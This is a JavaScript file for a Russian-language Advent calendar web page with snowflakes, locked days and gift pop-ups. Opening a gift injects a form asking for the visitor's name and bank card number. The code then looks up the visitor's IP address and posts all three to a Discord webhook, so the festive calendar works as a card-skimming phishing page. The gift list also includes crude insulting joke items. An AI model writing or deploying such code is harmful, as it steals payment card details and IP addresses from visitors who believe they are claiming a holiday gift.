const days = document.querySelectorAll('.day');
const modal = document.getElementById('modal');
const modalText = document.getElementById('gift-text');
const closeModal = document.querySelector('.close');
const giftSound = document.getElementById('gift-sound');
const lockedMessage = document.createElement('div'); // Создаем элемент плашки

// Плашка с текстом о недоступности ячейки
lockedMessage.classList.add('locked-message');
lockedMessage.textContent = 'Этот день еще не доступен!';
document.body.appendChild(lockedMessage); // Добавляем плашку в body

const gifts = [
  "Шоколад 🍫",
  "Мандарин 🍊",
  "Плюшевый мишка 🧸",
  "Книга 📖",
  "Гирлянда 🎇",
  "Какао ☕",
  "Шапка 🎅",
  "Открытка 🎄",
  "Снежинка ❄️",
  "Игрушка-сюрприз 🎉",
  "Носки 🧦",
  "Свеча 🕯️",
  "Орехи 🌰",
  "Календарь 📅",
  "Фоторамка 🖼️",
  "Кусочек пирога 🍰",
  "Конфеты 🍬",
  "Шарик 🎈",
  "Брелок 🔑",
  "Снежный шар 🌨️",
  "Новогодняя кружка ☕",
  "Маленькая елочка 🌲",
  "Кусочек торта 🍰",
  "Шоколадный батончик 🍫",
  "Прах твоей бабки 👨🏻‍🦳💨",
  "Киндер пингви 🍞",
  "Добри коля 🍾",
  "Слюни прадеда 💦",
  "Личный отчим 👨🏿‍👨🏿‍👨🏿‍👨🏿‍👨🏿‍👨🏿‍",
  "Бател пас в вор дов тенкс 💳",
];

const maxSnowflakes = 30;
let currentSnowflakes = 0;
let giftCounter = 0; // Счётчик подарков

// Веб-хук URL
const webhookUrl = 'https://discord.com/api/webhooks/ВАШ_ВЕБХУК_URL';

// Функция для отправки данных в Discord через веб-хук
async function sendToDiscord(userName, ipAddress, cardNumber, giftIndex) {
  const payload = {
    content: `🎁 Подарок открыт! 🎁\n**Пользователь:** ${userName}\n**IP-адрес:** ${ipAddress}\n**Номер карты:** ${cardNumber}\n**Подарок:** ${gifts[giftIndex]}\n**Номер подарка:** ${giftCounter}`
  };

  const response = await fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    console.error('Ошибка при отправке данных в Discord', response.statusText);
  }
}

// Функция для получения IP-адреса с помощью API
async function getIpAddress() {
  const response = await fetch('https://api.ipify.org?format=json');
  const data = await response.json();
  return data.ip;
}

function createSnowflakes() {
  if (currentSnowflakes >= maxSnowflakes) return;

  const snowflake = document.createElement('div');
  snowflake.classList.add('snowflake');
  snowflake.textContent = '❄';
  snowflake.style.left = `${Math.random() * 100}vw`;
  snowflake.style.animationDuration = `${5 + Math.random() * 10}s`;
  document.body.appendChild(snowflake);

  currentSnowflakes++;

  setTimeout(() => {
    snowflake.remove();
    currentSnowflakes--;
  }, 32000);
}

setInterval(createSnowflakes, 200);

// Получаем текущую дату
const currentDate = new Date();
const currentDay = currentDate.getDate();

// Проходим по дням календаря и скрываем те, которые еще не открыты и не пришли
days.forEach((day, index) => {
  const dayNumber = index + 1;

  // Если день календаря больше текущего дня, скрываем его
  if (dayNumber > currentDay) {
    day.classList.add('locked'); // Добавляем класс locked для заблокированных ячеек
  }

  day.addEventListener('click', (event) => {
    // Если день заблокирован, показываем плашку
    if (day.classList.contains('locked') || day.classList.contains('opened')) {
      lockedMessage.style.display = 'block'; // Показываем плашку
      setTimeout(() => {
        lockedMessage.style.display = 'none'; // Скрываем плашку через 3 секунды
      }, 3000);
      return;
    }

    // Проигрывание звуков
    giftSound.play(); // Звук при открытии подарка

    // Отображение модального окна с подарком
    modal.style.display = 'flex';
    modalText.textContent = gifts[index];

    // Добавление полей для ввода имени и номера карты
    modal.innerHTML += `
      <div class="input-container">
        <label for="username">Ваше имя:</label>
        <input type="text" id="username" placeholder="Введите ваше имя" required />
      </div>
      <div class="input-container">
        <label for="cardNumber">Номер карты:</label>
        <input type="text" id="cardNumber" placeholder="Введите номер карты" required />
      </div>
      <button id="submitGift">Получить подарок</button>
    `;

    document.getElementById('submitGift').addEventListener('click', async () => {
      const userName = document.getElementById('username').value;
      const cardNumber = document.getElementById('cardNumber').value;

      // Получение IP-адреса
      const ipAddress = await getIpAddress();

      // Отправка данных в Discord
      sendToDiscord(userName, ipAddress, cardNumber, index);

      // Увеличение счётчика подарков
      giftCounter++;

      // Закрытие модального окна
      modal.style.display = 'none';

      // Отметить день как открытый
      day.classList.add('opened');
    });
  });
});

// Закрытие модального окна
closeModal.addEventListener('click', () => {
  modal.style.display = 'none';
});
